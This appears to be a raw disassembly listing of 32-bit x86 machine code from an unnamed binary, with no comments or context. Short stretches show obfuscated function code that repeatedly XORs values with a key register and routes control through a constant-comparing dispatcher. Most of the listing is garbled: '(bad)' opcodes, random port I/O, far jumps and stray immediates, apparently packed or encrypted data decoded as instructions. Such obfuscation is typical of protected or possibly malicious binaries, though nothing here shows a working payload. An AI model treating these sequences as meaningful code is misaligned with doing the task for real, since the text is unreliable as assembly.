  409226:	stos   DWORD PTR es:[edi],eax
  409227:	push   ecx
  409228:	scas   al,BYTE PTR es:[edi]
  409229:	inc    esi
  40922a:	jmp    0x4091c2
  40922c:	(bad)  
  40922d:	sar    eax,0xf6
  409230:	test   eax,0x82c450cf
  409235:	into   
  409236:	(bad)  
  409237:	retf   
  409238:	push   ss
  409239:	fwait
  40923a:	test   eax,0xcbbb535a
  40923f:	pop    ebx
  409240:	xchg   ebx,esi
  409242:	sbb    eax,0x22ce6fe5
  409247:	mov    ah,0x27
  409249:	(bad)  [ebx-0x4c]
  40924c:	push   edx
  40924d:	pop    ss
  40924e:	neg    DWORD PTR [esi-0x6f94c065]
  409254:	sub    DWORD PTR [edx],esp
  409256:	xor    eax,esi
  409258:	add    eax,ebx
  40925a:	mov    DWORD PTR [ebp-0x54],eax
  40925d:	lea    eax,[ebp-0x1c]
  409260:	mov    DWORD PTR [ebp-0x50],eax
  409263:	mov    eax,DWORD PTR [ebp-0x60]
  409266:	xor    eax,esi
  409268:	add    eax,ebx
  40926a:	mov    DWORD PTR [ebp-0x60],eax
  40926d:	lea    eax,[ebp-0x60]
  409270:	push   eax
  409271:	mov    eax,DWORD PTR [ebp+0xc]
  409274:	xor    eax,esi
  409276:	add    eax,ebx
  409278:	push   eax
  409279:	mov    eax,ds:0x414b1e
  40927e:	push   0x414a74
  409283:	push   DWORD PTR [eax]
  409285:	call   0x411333
  40928a:	jmp    0x4092c1
  40928f:	cmp    edi,0x13c
  409295:	jne    0x4092c1
  40929b:	mov    eax,DWORD PTR [ebp-0x10]
  40929e:	xor    eax,esi
  4092a0:	add    eax,ebx
  4092a2:	mov    DWORD PTR [ebp+0x8],eax
  4092a5:	mov    eax,ds:0x414afe
  4092aa:	mov    DWORD PTR [ebp+0x8],eax
  4092ad:	mov    eax,DWORD PTR [ebp-0x14]
  4092b0:	mov    DWORD PTR [ebp-0x4],eax
  4092b3:	mov    eax,DWORD PTR [ebp-0x4]
  4092b6:	push   0x4
  4092b8:	pop    ecx
  4092b9:	sub    ecx,eax
  4092bb:	add    ecx,DWORD PTR [ebp-0x18]
  4092be:	mov    DWORD PTR [ebp-0x8],ecx
  4092c1:	mov    eax,DWORD PTR [ebp+0xc]
  4092c4:	xor    eax,esi
  4092c6:	lea    edi,[edi+eax*1+0x327299]
  4092cd:	cmp    edi,0x50a
  4092d3:	jne    0x4089c6
  4092d9:	mov    eax,DWORD PTR [ebp+0xc]
  4092dc:	pop    edi
  4092dd:	xor    eax,esi
  4092df:	pop    esi
  4092e0:	add    eax,ebx
  4092e2:	pop    ebx
  4092e3:	leave  
  4092e4:	ret    0x8
  4092e7:	push   ebp
  4092e8:	mov    ebp,esp
  4092ea:	sub    esp,0x44
  4092ed:	push   edi
  4092ee:	adc    DWORD PTR ds:0x4345b7,ebx
  4092f4:	mov    eax,DWORD PTR [ebp+0xc]
  4092f7:	mov    DWORD PTR [ebp-0x10],eax
  4092fa:	and    DWORD PTR ds:0x4345bb,0x5787
  409304:	jmp    0x40971b
  409309:	jns    0x4092bd
  40930b:	out    dx,al
  40930c:	std    
  40930d:	jge    0x40938c
  40930f:	or     eax,0x11d61472
  409314:	clc    
  409315:	mov    esp,0x9276ff93
  40931a:	loop   0x40939a
  40931c:	jle    0x40938e
  40931e:	jns    0x40939e
  409320:	jle    0x4092aa
  409322:	mov    esi,0x4d50c9a8
  409327:	cs out dx,eax
  409329:	cmp    eax,0x73b523db
  40932e:	ficomp DWORD PTR [edx+0x6b82382]
  409334:	lods   eax,DWORD PTR ds:[esi]
  409335:	popa   
  409336:	adc    cl,ah
  409338:	popa   
  409339:	cmp    ecx,edi
  40933b:	pop    ebp
  40933c:	hlt    
  40933d:	adc    al,0x52
  40933f:	adc    dl,dh
  409341:	addr16 pop ss
  409343:	pop    esp
  409344:	sbb    DWORD PTR [edi+ecx*4],ecx
  409347:	jne    0x409300
  409349:	add    eax,DWORD PTR [ecx+0x7bebacab]
  40934f:	in     eax,0x19
  409351:	sahf   
  409352:	jge    0x4093c7
  409354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409355:	fldcw  WORD PTR [edi+esi*4+0x73822f01]
  40935c:	idiv   DWORD PTR [ebp+0x6a40824d]
  409362:	lahf   
  409363:	pop    ebp
  409364:	icebp  
  409365:	shl    BYTE PTR [edi+0x70],0xc
  409369:	jns    0x409324
  40936b:	push   ebx
  40936c:	and    al,0x9d
  40936e:	push   ebp
  40936f:	jb     0x4093c1
  409371:	in     al,0xe3
  409373:	shr    eax,cl
  409375:	push   esp
  409376:	pop    ebp
  409377:	mov    ss,WORD PTR [edi+0x1bbf10c7]
  40937d:	adc    BYTE PTR [esp+eax*4+0x7a],0xc7
  409382:	lods   al,BYTE PTR ds:[esi]
  409383:	inc    edi
  409384:	test   BYTE PTR [edi-0x5f],0x29
  409388:	fnop   
  40938a:	inc    esp
  40938b:	pop    ebp
  40938c:	in     al,dx
  40938d:	jo     0x4093f9
  40938f:	cli    
  409390:	and    eax,0x3ec3c516
  409395:	call   0xa732:0xaecbc72a
  40939c:	inc    eax
  40939d:	out    dx,al
  40939e:	addr16 gs jnp 0x4093b5
  4093a2:	add    ah,BYTE PTR [edi-0x63]
  4093a5:	daa    
  4093a6:	out    0x31,eax
  4093a8:	fidiv  WORD PTR [edx]
  4093aa:	arpl   WORD PTR [edi-0x1bc76c8b],dx
  4093b0:	pop    edi
  4093b1:	mov    ch,0x42
  4093b3:	call   0x2a87:0xb9920e91
  4093ba:	mov    dl,0x2c
  4093bc:	push   ecx
  4093bd:	or     DWORD PTR [ecx-0x480934b4],edx
  4093c3:	(bad)  
  4093c4:	mov    al,ds:0xf82961bb
  4093c9:	cmp    DWORD PTR [eax],esi
  4093cb:	arpl   bp,cx
  4093cd:	inc    esi
  4093ce:	sbb    al,bh
  4093d0:	shl    DWORD PTR [edx+0x2c9ce8b6],cl
  4093d6:	or     dl,BYTE PTR ds:0x169f3182
  4093dc:	push   ecx
  4093dd:	jmp    0x1a78:0x98984d4c
  4093e4:	xchg   esi,eax
  4093e5:	sbb    cl,bh
  4093e7:	mov    dl,0x85
  4093e9:	xchg   esp,eax
  4093ea:	xor    eax,0x2ba39c68
  4093ef:	cmp    bl,al
  4093f1:	dec    ecx
  4093f2:	lahf   
  4093f3:	pop    edx
  4093f4:	jnp    0x409402
  4093f6:	stos   BYTE PTR es:[edi],al
  4093f7:	xor    al,0x90
  4093f9:	push   edx
  4093fa:	in     al,dx
  4093fb:	cwde   
  4093fc:	stos   BYTE PTR es:[edi],al
  4093fd:	pop    esi
  4093fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093ff:	fisubr WORD PTR es:[esi]
  409402:	mov    eax,ds:0x3e06f4cb
  409407:	sbb    bl,BYTE PTR ds:0xf98cc4dd
  40940d:	xchg   BYTE PTR [ecx+0x3c9b1a88],cl
  409413:	xchg   edx,eax
  409414:	pop    ecx
  409415:	cwde   
  409416:	pop    esi
  409417:	push   ebp
  409418:	retf   
  409419:	ret    
  40941a:	jae    0x4093c8
  40941c:	jle    0x409477
  40941e:	pop    ss
  40941f:	retf   
  409420:	inc    edi
  409421:	pushf  
  409422:	and    DWORD PTR [edx+0x3fed1fef],0x61
  409429:	push   eax
  40942a:	jecxz  0x409470
  40942c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40942d:	jp     0x40947a
  40942f:	sbb    al,0x95
  409431:	or     eax,0x4775be9b
  409436:	sub    dl,bl
  409438:	jnp    0x40945e
  40943a:	ret    
  40943b:	or     al,0xab
  40943d:	push   ebx
  40943e:	jmp    0x40941b
  409440:	push   ebx
  409441:	pop    ss
  409442:	out    0xad,eax
  409444:	out    dx,eax
  409445:	mov    ds:0xaced789a,eax
  40944a:	popa   
  40944b:	add    BYTE PTR [edx+0x78a85cf3],bh
  409451:	or     ecx,DWORD PTR [ebx-0x7d]
  409454:	jl     0x4094c7
  409456:	ins    DWORD PTR es:[edi],dx
  409457:	mov    WORD PTR ds:[eax+eax*4+0x77],fs
  40945c:	jo     0x4094a8
  40945e:	add    BYTE PTR [esi-0x3086c6c1],bh
  409464:	(bad)  
  409465:	push   cs
  409466:	push   ebp
  409467:	icebp  
  409468:	lock mov ebp,0xc99b7985
  40946e:	mov    eax,0x552f9e7c
  409473:	and    esi,DWORD PTR [ebx+0x60]
  409476:	xor    ecx,DWORD PTR [edi]
  409478:	or     al,0x6c
  40947a:	mov    esp,ecx
  40947c:	xchg   ecx,eax
  40947d:	xor    BYTE PTR [edx+0x61ece87d],cl
  409483:	push   0x3b7048de
  409488:	jecxz  0x40946a
  40948a:	fstp   DWORD PTR [edx+ebx*8-0x29c976a7]
  409491:	mov    ebp,0xd4c6756d
  409496:	ficom  DWORD PTR [ecx-0x688ec45a]
  40949c:	lahf   
  40949d:	xor    bh,BYTE PTR [esp+eiz*2-0x1c]
  4094a1:	leave  
  4094a2:	cmp    ebp,esp
  4094a4:	mov    bl,0x18
  4094a6:	adc    eax,0xf94eaf26
  4094ab:	test   al,0xca
  4094ad:	and    DWORD PTR [edx-0x76],edi
  4094b0:	adc    bh,BYTE PTR [esi+0x1]
  4094b3:	dec    ebx
  4094b4:	jnp    0x4094cd
  4094b6:	dec    ecx
  4094b7:	shl    bl,1
  4094b9:	iret   
  4094ba:	pop    eax
  4094bb:	xor    DWORD PTR [ebx+edi*4+0x33],edi
  4094bf:	jno    0x4094e1
  4094c1:	fmul   st,st(7)
  4094c3:	pop    ebx
  4094c4:	nop
  4094c5:	shl    BYTE PTR [esi+0x65a58779],0x55
  4094cc:	jmp    0x3fb3:0xa9f7888b
  4094d3:	or     ecx,DWORD PTR [edi+ebp*4+0x2]
  4094d7:	dec    ebp
  4094d8:	call   0x780ebebe
  4094dd:	fdiv   DWORD PTR [eax+0x68]
  4094e0:	dec    ecx
  4094e1:	push   DWORD PTR [ebx-0x18]
  4094e4:	and    BYTE PTR [ecx-0x73],bh
  4094e7:	fxch   st(2)
  4094e9:	fldenv [eax-0x3da544c7]
  4094ef:	ret    0x86d7
  4094f2:	jb     0x409515
  4094f4:	mov    ah,0xe5
  4094f6:	sub    eax,ecx
  4094f8:	sub    BYTE PTR [ebx-0x5e],ah
  4094fb:	mov    esp,0xffe780e6
  409500:	mov    ebp,esp
  409502:	jmp    0x44b8:0xba4e9a2e
  409509:	shl    DWORD PTR [eax],1
  40950b:	stos   DWORD PTR es:[edi],eax
  40950c:	mov    edi,eax
  40950e:	sar    BYTE PTR ds:0x9e4622a6,0x6a
  409515:	mov    BYTE PTR [ebx],dl
  409517:	stc    
  409518:	inc    esp
  409519:	mov    ecx,0x62850c35
  40951e:	pop    ebx
  40951f:	hlt    
  409520:	test   al,0x5c
  409522:	nop
  409523:	jns    0x4094e2
  409525:	or     bl,al
  409527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409528:	mov    al,ds:0xa797f84
  40952d:	pop    edx
  40952e:	jecxz  0x40952f
  409530:	jmpw   0x5004
  409534:	fstp   st(4)
  409536:	jp     0x40958e
  409538:	xchg   ecx,eax
  409539:	adc    ah,BYTE PTR [ecx+0xfdd5da7]
  40953f:	pop    ss
  409540:	(bad)  
  409541:	imul   ecx,DWORD PTR [edi+0x45],0x7539af10
  409548:	out    dx,eax
  409549:	mov    bl,0xa8
  40954b:	adc    DWORD PTR ds:0xdb4dd712,ecx
  409551:	jle    0x4094f3
  409553:	outs   dx,BYTE PTR ds:[esi]
  409554:	push   ecx
  409555:	outs   dx,DWORD PTR ds:[esi]
  409556:	and    bl,dl
  409558:	push   esi
  409559:	hlt    
  40955a:	into   
  40955b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40955c:	mov    ebx,0x37fe893f
  409561:	or     eax,eax
  409563:	cmc    
  409564:	ja     0x4094f5
  409566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409567:	popa   
  409568:	xchg   BYTE PTR [edi-0x7c45fe0c],dh
  40956e:	mov    esi,0x5e4dc31f
  409573:	pop    edi
  409574:	lods   eax,DWORD PTR ds:[esi]
  409575:	scas   eax,DWORD PTR es:[edi]
  409576:	xchg   BYTE PTR [esi],dl
  409578:	sar    ch,cl
  40957a:	shr    BYTE PTR [edi+edi*4],cl
  40957d:	cs ss in eax,0xfc
  409581:	mov    dl,0x18
  409583:	mov    ds:0x99d2ee6e,al
  409588:	inc    sp
  40958a:	jne    0x4095f2
  40958c:	out    0x62,eax
  40958e:	stc    
  40958f:	inc    ecx
  409590:	mov    eax,0x11eb9275
  409595:	into   
  409596:	xchg   esp,eax
  409597:	cmp    edx,edi
  409599:	or     eax,0x2a7cbe61
  40959e:	aaa    
  40959f:	fld    QWORD PTR [ecx+0x1062c6dc]
  4095a5:	shr    BYTE PTR [edi+0xb08d610],1
  4095ab:	dec    ebx
  4095ac:	dec    esi
  4095ad:	fiadd  DWORD PTR [ebp-0x71]
  4095b0:	or     eax,0x7e4c1a90
  4095b5:	out    0x2a,al
  4095b7:	nop
  4095b8:	jae    0x40957c
  4095ba:	add    ebp,DWORD PTR cs:[ebx-0x44]
  4095be:	push   ebp
  4095bf:	jge    0x409584
  4095c1:	shl    BYTE PTR [eax],1
  4095c3:	or     DWORD PTR [edi+edi*4-0x6f4ff2a7],0x6680446a
  4095ce:	iret   
  4095cf:	repz sub BYTE PTR [edx+0x18],bl
  4095d3:	inc    ebx
  4095d4:	and    eax,0xee46b5eb
  4095d9:	out    0xc0,eax
  4095db:	scas   eax,DWORD PTR es:[edi]
  4095dc:	fld    TBYTE PTR [edi+0x4e]
  4095df:	add    eax,0xa85fa363
  4095e4:	push   edx
  4095e5:	repnz mov dl,0xfd
  4095e8:	push   ebp
  4095e9:	(bad)  
  4095eb:	mov    ebp,0x7f745746
  4095f0:	das    
  4095f1:	jbe    0x40960e
  4095f3:	and    BYTE PTR [esi+esi*4],dh
  4095f6:	(bad)
  4095fa:	or     BYTE PTR [ecx+0x36],dh
  4095fd:	sbb    sp,di
  409600:	(bad)  
  409601:	and    eax,0x7bc2253d
  409606:	(bad)  
  409607:	in     al,0xb3
  409609:	cmp    eax,0x24d22d1a
  40960e:	sub    eax,0x6be18e1c
  409613:	icebp  
  409614:	arpl   WORD PTR [ecx],sp
  409616:	jb     0x4095da
  409618:	pop    esi
  409619:	cmp    BYTE PTR [edx],ah
  40961b:	call   0xa07d413c
  409620:	outs   dx,BYTE PTR ds:[esi]
  409621:	sub    dh,BYTE PTR [eax]
  409623:	dec    edi
  409624:	test   ch,cl
  409626:	push   ds
  409627:	push   cs
  409628:	pop    edx
  409629:	adc    eax,DWORD PTR ds:0x72516dd5
  40962f:	add    DWORD PTR [ecx+0x440456d1],ecx
  409635:	xchg   edx,eax
  409636:	out    0x57,al
  409638:	mov    esp,0x9d2b38e2
  40963d:	hlt    
  40963e:	dec    esi
  40963f:	sar    BYTE PTR [edi-0x45],cl
  409642:	xlat   BYTE PTR ds:[ebx]
  409643:	and    DWORD PTR [eax],edi
  409645:	xchg   edx,eax
  409646:	push   edx
  409647:	enter  0x976e,0xd3
  40964b:	sbb    bl,BYTE PTR [ebp+edi*2-0x7]
  40964f:	test   dl,ah
  409651:	mov    ?,WORD PTR [ebp+0x5c]
  409654:	mov    ecx,0x8cc2e81f
  409659:	push   edi
  40965a:	sbb    BYTE PTR [ecx],dh
  40965c:	(bad)  
  40965d:	dec    ebp
  40965e:	cmp    BYTE PTR [eax],ah
  409660:	sub    esi,DWORD PTR [edx]
  409662:	xchg   esi,eax
  409663:	pop    ebp
  409664:	push   esp
  409665:	xchg   edx,edx
  409667:	test   DWORD PTR [ecx+0x560e9d4f],edi
  40966d:	dec    ebp
  40966e:	jle    0x409696
  409670:	push   esp
  409671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409672:	push   es
  409673:	mov    ds:0xb62aab6,al
  409678:	push   cs
  409679:	xor    edi,ebx
  40967b:	int    0x6a
  40967d:	in     al,0x6b
  40967f:	dec    esi
  409680:	jae    0x409670
  409682:	ds fcomp st(2)
  409685:	(bad)  [esi+eiz*2+0x7314186]
  40968c:	and    dl,ch
  40968e:	in     al,0x46
  409690:	push   eax
  409691:	mov    fs,eax
  409693:	jae    0x409657
  409695:	mov    eax,ds:0xd302affa
  40969a:	fwait
  40969b:	push   esi
  40969c:	sub    cl,BYTE PTR [edx+0x5e384cc4]
  4096a2:	stos   DWORD PTR es:[edi],eax
  4096a3:	cmp    ecx,edx
  4096a5:	sbb    BYTE PTR [edi+0x709e27b4],dh
  4096ab:	cld    
  4096ac:	fldenv [esi]
  4096ae:	add    al,0xf3
  4096b0:	add    DWORD PTR [edx-0x2a],ebp
  4096b3:	and    dh,BYTE PTR [eax+ecx*4]
  4096b6:	inc    ebx
  4096b7:	dec    esi
  4096b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096b9:	mov    dl,0x3b
  4096bb:	hlt    
  4096bc:	mov    ch,0x92
  4096be:	sbb    BYTE PTR [edx+0x62],cl
  4096c1:	adc    BYTE PTR [ebp+0x1e98d57e],dh
  4096c7:	sbb    esp,DWORD PTR [eax+0x7548e048]
  4096cd:	push   cs
  4096ce:	mov    dl,0xdb
  4096d0:	stos   DWORD PTR es:[edi],eax
  4096d1:	jnp    0x40968c
  4096d3:	jmp    0x40967d
  4096d5:	pop    esp
  4096d6:	adc    ebx,edx
  4096d8:	loopne 0x4096ba
  4096da:	or     eax,0x1ed6ab8d
  4096df:	sbb    eax,0x6b6fb06d
  4096e4:	lahf   
  4096e5:	sbb    al,0x59
  4096e7:	sub    al,0x7c
  4096e9:	mov    dh,0x16
  4096eb:	(bad)  
  4096ec:	mov    esi,ds
  4096ee:	out    dx,al
  4096ef:	xchg   esp,eax
  4096f0:	push   0x8b382886
  4096f5:	or     ax,0xf8f6
  4096f9:	call   0x60fb:0x519f5a50
  409700:	push   0xffffff94
  409702:	out    0xc4,eax
  409704:	push   ecx
  409705:	shr    DWORD PTR [edi+esi*2+0x6d52bb0a],1
  40970c:	mov    edx,0x6487a01e
  409711:	and    ch,BYTE PTR [ebx+0x7be5cd3c]
  409717:	imul   eax,DWORD PTR [eax+0x56],0xffffffa6
  40971b:	mov    eax,DWORD PTR [ebp+0x8]
  40971e:	mov    edi,DWORD PTR ds:0x43468f
  409724:	or     DWORD PTR ds:0x434693,edi
  40972a:	mov    DWORD PTR [ebp+0x8],0xf89c8536
  409731:	xor    edi,0x551
  409737:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40973e:	movzx  ecx,WORD PTR ds:0x434573
  409745:	add    ecx,DWORD PTR ds:0x4345b7
  40974b:	mov    DWORD PTR ds:0x434573,ecx
  409751:	mov    edx,DWORD PTR [ebp+0x8]
  409754:	jmp    0x409b6b
  409759:	jmp    0x409767
  40975b:	or     al,0xd8
  40975d:	std    
  40975e:	fdiv   st,st(3)
  409760:	sbb    eax,0x3c00db39
  409765:	jae    0x40973a
  409767:	push   ebp
  409768:	sete   dh
  40976b:	jle    0x4097eb
  40976d:	jo     0x4097e8
  40976f:	jle    0x4097ef
  409771:	xor    al,0x7a
  409773:	or     BYTE PTR [eax+ebx*8],ah
  409776:	sar    ah,1
  409778:	pop    ecx
  409779:	hlt    
  40977a:	cld    
  40977b:	cmp    ecx,DWORD PTR [ecx]
  40977d:	cmp    eax,0x4176b2ae
  409782:	mov    eax,ds:0x45575979
  409787:	fmul   QWORD PTR [ecx]
  409789:	adc    al,0x5c
  40978b:	mov    ds:0x550b79a8,eax
  409790:	dec    eax
  409791:	popa   
  409792:	and    BYTE PTR [edx+eax*4],0xf5
  409796:	(bad)  
  409797:	dec    ebp
  409798:	mov    ebp,0xa5d10183
  40979d:	xchg   edi,eax
  40979e:	mov    bl,0x32
  4097a0:	and    BYTE PTR [ecx+eiz*1-0x37],0x60
  4097a5:	dec    edi
  4097a6:	in     al,0x63
  4097a8:	fild   WORD PTR [ebp+0x7f]
  4097ab:	xchg   BYTE PTR ds:0x153cfc63,ch
  4097b1:	cdq    
  4097b2:	ret    0x3a2f
  4097b5:	xchg   esp,eax
  4097b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097b7:	fisub  WORD PTR [esi]
  4097b9:	sbb    al,0x9d
  4097bb:	push   cs
  4097bc:	in     al,dx
  4097bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097be:	sub    eax,0x82a037a5
  4097c3:	hlt    
  4097c4:	cs sahf 
  4097c6:	inc    edx
  4097c7:	dec    ecx
  4097c8:	test   BYTE PTR [eax+0x4c8e1556],bl
  4097ce:	xchg   ebx,eax
  4097cf:	fcomp  QWORD PTR [edi-0x6d]
  4097d2:	paddsw mm5,QWORD PTR [edi-0x14affa2a]
  4097d9:	mov    esi,0x8bc30ab2
  4097de:	jno    0x4097bc
  4097e0:	mov    ds:0x4a1ebd3,al
  4097e5:	mov    al,ds:0x1c8d54c2
  4097ea:	and    DWORD PTR [ecx+0x30aa686e],ecx
  4097f0:	arpl   sp,ax
  4097f2:	pop    eax
  4097f3:	jecxz  0x4097ba
  4097f5:	push   0x61e753b2
  4097fa:	out    0x79,eax
  4097fc:	push   esp
  4097fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097fe:	xor    eax,0xcfd24825
  409803:	dec    ebp
  409804:	lahf   
  409805:	inc    ebx
  409806:	add    bl,cl
  409808:	mov    ch,0xa9
  40980a:	shl    DWORD PTR [si-0x6a49],1
  40980f:	cmp    DWORD PTR [ebp-0x3819c7ae],edx
  409815:	aaa    
  409816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409817:	mov    al,0xa0
  409819:	ds cs ds xchg ch,cl
  40981e:	pop    es
  40981f:	mov    ds:0x4605abee,al
  409824:	push   ebp
  409825:	sbb    BYTE PTR [ebp+0x35],dh
  409828:	fsubr  st,st(6)
  40982a:	xlat   BYTE PTR ds:[ebx]
  40982b:	mov    edx,0x26e72916
  409830:	cli    
  409831:	fstp   QWORD PTR [eax+ebp*2]
  409834:	jle    0x4097f9
  409836:	inc    ecx
  409837:	mov    esi,0xe882a5ed
  40983c:	(bad)  
  40983d:	int    0x3b
  40983f:	mov    ds:0x9d428918,al
  409844:	addr16 mov cl,0x22
  409847:	add    bl,ch
  409849:	inc    eax
  40984a:	test   al,0x68
  40984c:	inc    edx
  40984d:	jns    0x4098bb
  40984f:	push   ds
  409850:	push   ecx
  409851:	jae    0x409812
  409853:	out    0x92,al
  409855:	mov    ecx,0x56f0d8c
  40985a:	mov    eax,0x9cef815a
  40985f:	push   es
  409860:	add    BYTE PTR [edi-0x30a68f2e],al
  409866:	test   al,0xdf
  409868:	ficom  WORD PTR [ebx+0x78]
  40986b:	outs   dx,WORD PTR ds:[esi]
  40986d:	inc    ebp
  40986e:	loope  0x40980a
  409870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409871:	jo     0x409802
  409873:	jns    0x409834
  409875:	stos   DWORD PTR es:[edi],eax
  409876:	cmp    eax,0x6fea9dea
  40987b:	sbb    BYTE PTR ds:0x60bcdef0,bl
  409881:	mov    esp,ebx
  409883:	push   ebx
  409884:	jmp    0x40982a
  409886:	jb     0x4098b7
  409888:	mov    cl,0x30
  40988a:	cs push edi
  40988c:	ins    BYTE PTR es:[edi],dx
  40988d:	sbb    eax,0xd0891264
  409892:	mov    edi,DWORD PTR [ebp+0xe]
  409895:	lea    esp,[ebx+0x39adc4eb]
  40989b:	cdq    
  40989c:	jge    0x4098df
  40989e:	into   
  40989f:	sar    DWORD PTR [ebx+0x10],cl
  4098a2:	clc    
  4098a3:	call   0x8282116
  4098a8:	adc    eax,0x4b23413f
  4098ad:	sub    bh,BYTE PTR [ecx+0x33]
  4098b0:	pop    esp
  4098b1:	fmulp  st(6),st
  4098b3:	nop
  4098b4:	push   0x1f5e2941
  4098b9:	push   ds
  4098ba:	xor    eax,0xf458e536
  4098bf:	dec    eax
  4098c0:	adc    DWORD PTR [edi-0x21],ecx
  4098c3:	mov    dl,0x25
  4098c5:	fld    DWORD PTR [edi]
  4098c7:	jae    0x4098c6
  4098c9:	sub    cl,BYTE PTR [ebp-0x37]
  4098cc:	ins    DWORD PTR es:[edi],dx
  4098cd:	pop    esi
  4098ce:	add    dh,ah
  4098d0:	into   
  4098d1:	and    al,dh
  4098d3:	push   0xa1ad870f
  4098d8:	repnz pop esp
  4098da:	ret    
  4098db:	add    eax,0xbadad737
  4098e0:	int3   
  4098e1:	jne    0x4098e4
  4098e3:	and    eax,0xdee9a505
  4098e8:	push   0x4507eb57
  4098ed:	ins    BYTE PTR es:[edi],dx
  4098ee:	mov    dl,0x49
  4098f0:	mov    al,0x8
  4098f2:	dec    DWORD PTR [eax-0x80]
  4098f5:	xchg   ecx,eax
  4098f6:	stos   BYTE PTR es:[edi],al
  4098f7:	jnp    0x409921
  4098f9:	mov    al,ds:0x1d084ae7
  4098fe:	mov    esi,0x9c56d89f
  409903:	sbb    ebx,DWORD PTR [edi+0xc8c2eba]
  409909:	ror    cl,1
  40990b:	fisttp WORD PTR [ebp-0x35]
  40990e:	and    eax,0xa3c61751
  409913:	(bad)
  409917:	dec    edx
  409918:	in     al,0x8e
  40991a:	les    eax,FWORD PTR [edi]
  40991c:	sub    BYTE PTR [ecx-0x45],bh
  40991f:	mov    bl,0xf5
  409921:	mov    ds:0x548ff6ca,al
  409926:	sub    edi,DWORD PTR [ebx+0x71]
  409929:	fild   QWORD PTR [edi+0x35]
  40992c:	ins    DWORD PTR es:[edi],dx
  40992d:	out    dx,al
  40992e:	jecxz  0x409921
  409930:	push   ecx
  409931:	scas   eax,DWORD PTR es:[edi]
  409932:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409933:	cmp    eax,DWORD PTR [edi]
  409935:	out    0x3e,al
  409937:	out    0xc5,eax
  409939:	cmp    al,0x2e
  40993b:	pop    esi
  40993c:	cli    
  40993d:	(bad)  
  40993e:	cmp    DWORD PTR [edx+ecx*2+0x44],eax
  409942:	bound  eax,QWORD PTR [ebx+edx*4]
  409945:	scas   al,BYTE PTR es:[edi]
  409946:	cli    
  409947:	sbb    BYTE PTR [eax+0x3f],0x8e
  40994b:	test   bl,bl
  40994d:	aas    
  40994e:	or     bl,0x5
  409951:	add    bl,bh
  409953:	(bad)  [ecx]
  409955:	push   0xffffffc8
  409957:	push   esp
  409958:	pop    esp
  409959:	or     eax,0xf6c21404
  40995e:	jnp    0x40997f
  409960:	jg     0x4098ff
  409962:	pop    esi
  409963:	ret    0xb3ae
  409966:	ret    0x7a61
  409969:	cs leave 
  40996b:	add    bl,ah
  40996d:	pop    esp
  40996e:	fdivr  DWORD PTR ds:0xb37a47f9
  409974:	in     eax,dx
  409975:	scas   al,BYTE PTR es:[edi]
  409976:	int3   
  409977:	loopne 0x4099df
  409979:	xchg   esi,eax
  40997a:	inc    ebx
  40997b:	lds    ecx,FWORD PTR [edx-0x1259d080]
  409981:	sub    dh,dl
  409983:	mov    ebx,DWORD PTR [ebx+0x7b]
  409986:	adc    edi,DWORD PTR [ebp+ecx*8-0x3f7e6d98]
  40998d:	cmc    
  40998e:	push   ebp
  40998f:	add    esp,DWORD PTR [ecx-0x65]
  409992:	mov    al,0xe9
  409994:	hlt    
  409995:	dec    eax
  409996:	out    dx,eax
  409997:	push   ss
  409998:	punpckldq mm7,DWORD PTR [edx-0x5d]
  40999c:	cmp    al,0xc7
  40999e:	call   0x1d00f190
  4099a3:	cmc    
  4099a4:	or     ah,cl
  4099a6:	call   0xe03b2d4c
  4099ab:	pop    esp
  4099ac:	or     dh,BYTE PTR [esi-0xa]
  4099af:	popf   
  4099b0:	ret    0xbf2
  4099b3:	sub    al,0x6e
  4099b5:	mov    dl,BYTE PTR [ebx]
  4099b7:	dec    edx
  4099b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099b9:	out    dx,al
  4099ba:	adc    cl,dh
  4099bc:	push   ss
  4099bd:	int    0xbc
  4099bf:	fwait
  4099c0:	repnz lods eax,DWORD PTR ds:[esi]
  4099c2:	mov    ss,edx
  4099c4:	sub    DWORD PTR [edx-0x32],0xdb16ccf2
  4099cb:	les    ebp,FWORD PTR [ebx]
  4099cd:	fisub  WORD PTR [ecx-0x234dc06a]
  4099d3:	je     0x40998b
  4099d5:	inc    ebp
  4099d6:	jae    0x409a0c
  4099d8:	stc    
  4099d9:	je     0x409a0d
  4099db:	in     al,0x92
  4099dd:	gs push ecx
  4099df:	push   0x25
  4099e1:	jmp    0x409a2f
  4099e3:	jecxz  0x409a47
  4099e5:	jbe    0x4099e2
  4099e7:	push   ds
  4099e8:	adc    cl,ah
  4099ea:	int3   
  4099eb:	outs   dx,BYTE PTR ds:[esi]
  4099ec:	add    eax,0x6f0a3be9
  4099f1:	or     dh,dl
  4099f3:	jl     0x4099b9
  4099f5:	pushf  
  4099f6:	dec    esi
  4099f7:	dec    esp
  4099f8:	jge    0x4099cd
  4099fa:	fsub   QWORD PTR [edx+0x6b]
  4099fd:	inc    edi
  4099fe:	xchg   ebp,eax
  4099ff:	mov    esi,0x4176e606
  409a04:	jbe    0x409a72
  409a06:	or     DWORD PTR [ecx+ebx*4+0x39],eax
  409a0a:	dec    esi
  409a0b:	ficom  WORD PTR [edx-0xe918db0]
  409a11:	(bad)  
  409a12:	gs push edx
  409a14:	les    ebx,FWORD PTR [ecx-0xb]
  409a17:	jns    0x4099c4
  409a19:	je     0x409a3e
  409a1b:	mov    ebx,0x7187049d
  409a20:	xchg   ebp,eax
  409a21:	mov    dl,0x23
  409a23:	or     esp,DWORD PTR [edi+0x582a4350]
  409a29:	push   ebx
  409a2a:	push   ebx
  409a2b:	add    bh,dl
  409a2d:	push   ebp
